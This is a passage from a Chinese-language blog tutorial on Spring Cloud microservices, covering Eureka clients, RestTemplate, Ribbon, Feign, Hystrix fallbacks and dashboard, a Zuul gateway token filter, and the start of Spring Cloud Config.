class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependencyManagement</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-dependencies<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">type</span>&gt;</span>pom<span class=\"tag\">&lt;/<span class=\"name\">type</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>import<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependencyManagement</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>reousece&#x2F;application.yml</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"attr\">service-url:</span></span><br><span class=\"line\">      <span class=\"attr\">defaultZone:</span> <span class=\"string\">http://localhost:8761/eureka/</span></span><br><span class=\"line\">    <span class=\"attr\">register-with-eureka:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8764</span></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">consumer-client</span></span><br></pre></td></tr></table></figure>\n<p>启动类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ConsumerClientApplication</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">\t\tSpringApplication.run(ConsumerClientApplication.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h4 id=\"使用RestTemplate\"><a href=\"#使用RestTemplate\" class=\"headerlink\" title=\"使用RestTemplate\"></a>使用RestTemplate</h4><p>如果RestTemplate调用远程接口，新建如下类<br>配置类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SpringBeanConfig</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"comment\">//负载均衡</span></span><br><span class=\"line\">    <span class=\"meta\">@LoadBalanced</span></span><br><span class=\"line\">    RestTemplate <span class=\"title function_\">restTemplate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RestTemplate</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Controller调用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;client&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoClientController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> RestTemplate restTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;home&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">home</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> restTemplate.getForObject(<span class=\"string\">&quot;http://EUREKA-DISCOVERY/demo/home?name=whh&quot;</span>, String.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动消费客户端，访问localhsot:8764&#x2F;client&#x2F;home，返回的eureka服务提供者返回的值，eureka服务提供者可以通过修改端口，启动多个服务，在客户端调用时会自动做负载均衡。</p>\n<h4 id=\"Ribbon\"><a href=\"#Ribbon\" class=\"headerlink\" title=\"Ribbon\"></a>Ribbon</h4><p>在消费客户端使用的事spring-cloud-starter-eureka，该依赖包含ribbon，所以使用的是ribbon做的负载均衡。<br>常用的负载均衡策略有：</p>\n<ul>\n<li>简单轮询负载均衡</li>\n<li>加权响应时间负载均衡</li>\n<li>区域感知轮询负载均衡</li>\n<li>随机负载均衡</li>\n</ul>\n<h4 id=\"Feign\"><a href=\"#Feign\" class=\"headerlink\" title=\"Feign\"></a>Feign</h4><p>通过Feign封装了HTTP调用服务方法，使得客户端像调用本地方法那样直接调用方法，Feign默认集成了Ribbon，默认实现了负载均衡。<br>在上述消费客户端pom文件中加入Feign依赖：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-feign<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在启动的main方法中添加注解**@EnableFeignClients**开启Feign<br>新建接口用于远程调用，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//远程服务</span></span><br><span class=\"line\"><span class=\"meta\">@FeignClient(value = &quot;eureka-discovery&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;demo&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">DemoRemoteService</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;home&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    String <span class=\"title function_\">home</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;name&quot;)</span> String name)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在Controller中新增调用方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> DemoRemoteService demoRemoteService;</span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;feignHome&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">feignHome</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> demoRemoteService.home(<span class=\"string\">&quot;whh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动client，浏览器调用client接口即可查看返回数据。</p>\n<h3 id=\"Hystrix-（熔断器）\"><a href=\"#Hystrix-（熔断器）\" class=\"headerlink\" title=\"Hystrix （熔断器）\"></a>Hystrix （熔断器）</h3><p>熔断器，容错管理工具，旨在通过熔断机制控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。可以防止服务雪崩效应。<br>在pom文件中新增Hystrix依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-hystrix<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>修改application.yml配置启动Hystrix，添加：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">feign:</span></span><br><span class=\"line\">  <span class=\"attr\">hystrix:</span></span><br><span class=\"line\">    <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>Main添加注解**@EnableHystrix**启动hystrix</p>\n<h4 id=\"fallback-降级\"><a href=\"#fallback-降级\" class=\"headerlink\" title=\"fallback 降级\"></a>fallback 降级</h4><p>修改上述DemoRemoteService</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@FeignClient(value = &quot;eureka-discovery&quot;, path = &quot;demo&quot;, fallback = DemoRemoteServiceFallBack.class)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">DemoRemoteService</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;home&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    String <span class=\"title function_\">home</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;name&quot;)</span> String name)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>新增DemoRemoteService子类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoRemoteServiceFallBack</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">DemoRemoteService</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">home</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name + <span class=\"string\">&quot; System Error&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动消费客户端，访问接口正常，关闭服务提供，重新访问接口，返回熔断器定义的错误信息。</p>\n<ul>\n<li>需要注意的地方是，之前DemoRemoteService中，定义class的请求路径为@RequestMapping(“demo”)，这次修改为在FeignClient中的path中设置路径，不然在使用fallback的时候会报错。</li>\n</ul>\n<p>如果客户端Controller方法修改为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt;&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; j &lt; <span class=\"number\">100</span>; j++) &#123;</span><br><span class=\"line\">            System.out.println(demoRemoteService.home(<span class=\"string\">&quot;whh&quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;).start();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>虽然服务正常，但是还是会触发降级，返回System Error。这就涉及到Hystrix隔离策略。</p>\n<h4 id=\"隔离策略\"><a href=\"#隔离策略\" class=\"headerlink\" title=\"隔离策略\"></a>隔离策略</h4><p>hystrix提供了两种隔离策略：线程池隔离和信号量隔离。hystrix默认采用线程池隔离。</p>\n<ul>\n<li><p>线程池隔离：</p>\n<blockquote>\n<p>不同服务通过使用不同线程池，彼此间将不受影响，达到隔离效果。</p>\n</blockquote>\n</li>\n<li><p>信号量隔离：</p>\n<blockquote>\n<p>线程隔离会带来线程开销，有些场景（比如无网络请求场景）可能会因为用开销换隔离得不偿失，为此hystrix提供了信号量隔离，当服务的并发数大于信号量阈值时将进入fallback。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"熔断机制\"><a href=\"#熔断机制\" class=\"headerlink\" title=\"熔断机制\"></a>熔断机制</h4><p>熔断机制相当于电路的跳闸功能，举个栗子，我们可以配置熔断策略为当请求错误比例在10s内&gt;50%时，该服务将进入熔断状态，后续请求都会进入fallback。</p>\n<h4 id=\"结果cache\"><a href=\"#结果cache\" class=\"headerlink\" title=\"结果cache\"></a>结果cache</h4><p>hystrix支持将一个请求结果缓存起来，下一个具有相同key的请求将直接从缓存中取出结果，减少请求开销。要使用hystrix cache功能，第一个要求是重写getCacheKey()，用来构造cache key；第二个要求是构建context，如果请求B要用到请求A的结果缓存，A和B必须同处一个context。</p>\n<h4 id=\"合并请求collapsing\"><a href=\"#合并请求collapsing\" class=\"headerlink\" title=\"合并请求collapsing\"></a>合并请求collapsing</h4><p>hystrix支持N个请求自动合并为一个请求，这个功能在有网络交互的场景下尤其有用，比如每个请求都要网络访问远程资源，如果把请求合并为一个，将使多次网络交互变成一次，极大节省开销。重要一点，两个请求能自动合并的前提是两者足够“近”，即两者启动执行的间隔时长要足够小，默认为10ms，即超过10ms将不自动合并。</p>\n<h4 id=\"仪表盘\"><a href=\"#仪表盘\" class=\"headerlink\" title=\"仪表盘\"></a>仪表盘</h4><p>添加修改依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-hystrix-dashboard<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在启动的Main方法中加入**@EnableHystrixDashboard**启动Hystrix 仪表盘<br>访问<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY0L2h5c3RyaXglRUYlQkMlOEMlRTUlODclQkElRTclOEUlQjBIeXN0cml4\">http://localhost:8764/hystrix，出现Hystrix<i class=\"fa fa-external-link-alt\"></i></span> Dashboard界面，url填写<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY0L2h5c3RyaXguc3RyZWFtJUVGJUJDJThDVGl0bGUlRTUlOEYlQUYlRTQlQkIlQTUlRTklOUElOEYlRTYlODQlOEYlRTUlQTElQUIlRTUlODYlOTklRUYlQkMlOEMlRTclODIlQjklRTUlODclQkJNb25pdG9y\">http://localhost:8764/hystrix.stream，Title可以随意填写，点击Monitor<i class=\"fa fa-external-link-alt\"></i></span> Stream后，访问<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY0L2NsaWVudC9mZWlnbkhvbWU=\">http://localhost:8764/client/feignHome<i class=\"fa fa-external-link-alt\"></i></span> 即可看到图标的出现。</p>\n<p>还有其他参数：参考下方url<br>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9iOWFmMDI4ZWZlYmI=\">Hystrix使用入门手册<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li>Hystrix相关资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwNTk4ODg5NQ==\">防雪崩利器：熔断器 Hystrix 的原理与使用<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>集群监控使用Turbine</p>\n<h3 id=\"zuul（路由网关）\"><a href=\"#zuul（路由网关）\" class=\"headerlink\" title=\"zuul（路由网关）\"></a>zuul（路由网关）</h3><p>Zuul 是在云平台上提供动态路由,监控,弹性,安全等边缘服务的框架。Zuul 相当于是设备和 Netflix 流应用的 Web 网站后端所有请求的前门。路由功能是微服务的一部分，比如／api&#x2F;user转发到到user服务，&#x2F;api&#x2F;shop转发到到shop服务。zuul默认和Ribbon结合实现了负载均衡的功能。</p>\n<p>新建maven项目zuul-server<br>pom文件和之前一样，只是依赖需要修改为如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-zuul<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>新建yml配置文件：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># eureka 服务配置</span></span><br><span class=\"line\"><span class=\"attr\">eureka:</span></span><br><span class=\"line\">  <span class=\"attr\">client:</span></span><br><span class=\"line\">    <span class=\"attr\">service-url:</span></span><br><span class=\"line\">      <span class=\"attr\">defaultZone:</span> <span class=\"string\">http://localhost:8761/eureka/</span></span><br><span class=\"line\">    <span class=\"attr\">register-with-eureka:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8765</span></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">application:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">zull-server</span></span><br><span class=\"line\"><span class=\"comment\"># zuul规则配置</span></span><br><span class=\"line\"><span class=\"attr\">zuul:</span></span><br><span class=\"line\">  <span class=\"attr\">routes:</span></span><br><span class=\"line\">    <span class=\"attr\">api:</span></span><br><span class=\"line\">      <span class=\"attr\">path:</span> <span class=\"string\">/api/**</span></span><br><span class=\"line\">      <span class=\"attr\">serviceId:</span> <span class=\"string\">eureka-discovery</span></span><br></pre></td></tr></table></figure>\n<p>启动之前eureka-server、eureka-discovery(分端口启动2次)、启动zull-server，访问<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY1L2FwaS9kZW1vL2hvbWU/bmFtZT13aGg=\">http://localhost:8765/api/demo/home?name=whh<i class=\"fa fa-external-link-alt\"></i></span> 可以看到返回值为eureka-discovery提供。<br>zull规则可以配置eureka服务中心注册的serviceId、url、自定义处理等，同时也可以关闭某个服务。</p>\n<h4 id=\"zuul服务过滤\"><a href=\"#zuul服务过滤\" class=\"headerlink\" title=\"zuul服务过滤\"></a>zuul服务过滤</h4><p>zuul可以通过定义filter做一些相关请求过滤，比如登陆拦截，指定参数拦截等。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoFilter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ZuulFilter</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 返回一个字符串代表过滤器的类型，在zuul中定义了四种不同生命周期的过滤器类型</span></span><br><span class=\"line\"><span class=\"comment\">     * 为啥不是枚举</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">filterType</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * pre：路由之前</span></span><br><span class=\"line\"><span class=\"comment\">         * routing：路由之时</span></span><br><span class=\"line\"><span class=\"comment\">         * post：路由之后</span></span><br><span class=\"line\"><span class=\"comment\">         * error：发送错误调用</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;pre&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 过滤的顺序</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">filterOrder</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 这里可以写逻辑判断，是否要过滤</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">shouldFilter</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 过滤器的具体逻辑</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">RequestContext</span> <span class=\"variable\">ctx</span> <span class=\"operator\">=</span> RequestContext.getCurrentContext();</span><br><span class=\"line\">        <span class=\"type\">HttpServletRequest</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> ctx.getRequest();</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">token</span> <span class=\"operator\">=</span> request.getParameter(<span class=\"string\">&quot;token&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (token == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            ctx.setSendZuulResponse(<span class=\"literal\">false</span>);</span><br><span class=\"line\">            ctx.setResponseStatusCode(<span class=\"number\">401</span>);</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                ctx.getResponse().getWriter().write(<span class=\"string\">&quot;token null, need login&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>重新启动zuul-server<br>访问<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY1L2FwaS9kZW1vL2hvbWU/bmFtZT13aGg=\">http://localhost:8765/api/demo/home?name=whh<i class=\"fa fa-external-link-alt\"></i></span> 会返回失败<br>访问<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo4NzY1L2FwaS9kZW1vL2hvbWU/bmFtZT1hc2RmYXNkZmFzZiZzPWFhYSZ0b2tlbj10ZXN0\">http://localhost:8765/api/demo/home?name=asdfasdfasf&amp;s=aaa&amp;token=test<i class=\"fa fa-external-link-alt\"></i></span> 会正常返回。</p>\n<h3 id=\"Spring-Cloud-Config（中心化配置）\"><a href=\"#Spring-Cloud-Config（中心化配置）\" class=\"headerlink\" title=\"Spring Cloud Config（中心化配置）\"></a>Spring Cloud Config（中心化配置）</h3><p>在搭建微服务的时候，各种配置都是配置在本地，为了方便配置文件的管理，实时更新，所以需要使用分布式配置中心组件。在Spring Cloud Config中配置文件可以放到配置服务本地，也可以放入到远程仓库中，如git。</p>\n<p>因为公司用的svn，网络上大量的git教程，此处采用公司svn作为远程仓库。svn目录结构为：configuration&#x2F;beta&#x2F;xxxx&#x2F;application.properties</p>\n<p>新建maven项目<br>pom文件依赖为：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.cloud<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-cloud-config-server<span 